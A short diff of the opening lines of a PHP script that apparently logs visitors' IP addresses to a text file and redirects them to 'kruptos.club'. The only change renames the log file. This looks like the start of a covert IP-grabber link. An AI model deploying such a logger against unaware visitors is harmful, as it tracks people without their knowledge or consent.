@@ -1,5 +1,5 @@
 <?php
-$file = "iplog.txt";
+$file = "ips.txt";
 $returnurl = "kruptos.club";
 function getRealIpAddr() {
 	if (!empty($_SERVER['HTTP_CLIENT_IP']))
